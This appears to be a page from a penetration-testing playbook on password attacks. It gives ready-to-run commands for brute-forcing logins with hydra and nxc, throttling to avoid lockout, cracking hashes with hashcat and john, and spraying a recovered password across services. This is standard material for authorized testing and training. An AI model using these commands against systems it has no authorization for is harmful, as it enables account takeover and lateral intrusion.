---
summary: Password attacks & hash cracking — hydra online brute, hashcat/john offline, wordlist + rules.
status: active
tags: [security, playbook, passwords, cracking]
private: false
---

# Password Attacks & Hash Cracking

Two modes: **online** (guess against a live service) and **offline** (crack a captured hash). Prefer offline — quieter and faster.

## Online brute (hydra / nxc)

```bash
hydra -l admin -P rockyou.txt $IP http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid"          # web form
hydra -L users.txt -P pass.txt ssh://$IP -t 4
nxc smb $IP -u users.txt -p pass.txt --continue-on-success
```

- Throttle (`-t 4`) to avoid lockout. Spray one password across many users rather than many passwords at one user.

## Identify the hash

```bash
hashid '<hash>'          # or hash-identifier / name-that-hash
```

## Offline cracking (hashcat)

```bash
hashcat -m <mode> hashes.txt rockyou.txt              # straight
hashcat -m <mode> hashes.txt rockyou.txt -r best64.rule   # + rules
```

Common modes: `0` MD5 · `100` SHA1 · `1400` SHA256 · `1800` sha512crypt (`$6$`) · `500` md5crypt (`$1$`) · `3200` bcrypt (`$2*$`) · `13100` Kerberoast TGS · `18200` AS-REP · `1000` NTLM · `5600` NetNTLMv2.

## Offline cracking (john)

```bash
# built-in *2john tools convert files to crackable hashes
ssh2john id_rsa > hash; john --wordlist=rockyou.txt hash
zip2john x.zip > hash;  john hash;  john --show hash
# also: keepass2john, gpg2john, unshadow passwd shadow > hash
```

## Wordlists & mutation

- `rockyou.txt`, SecLists `Passwords/`, `cewl http://$IP -d 3 -w custom.txt` (site-scraped).
- Rules: `best64.rule`, `rockyou-30000.rule`, `dive.rule`.
- `hashcat --stdout wordlist -r rule` to preview mutations.

## Reuse

Cracked one password → **spray it everywhere** (SSH, SMB, web, sudo). Credential reuse is the single most common lateral path.

## Related

- [Pentest Playbook — Index](kb://11-security-playbook-pentest-playbook-index)
- [Active Directory](kb://11-security-playbook-active-directory)
- [Linux Privilege Escalation](kb://11-security-playbook-linux-privesc)
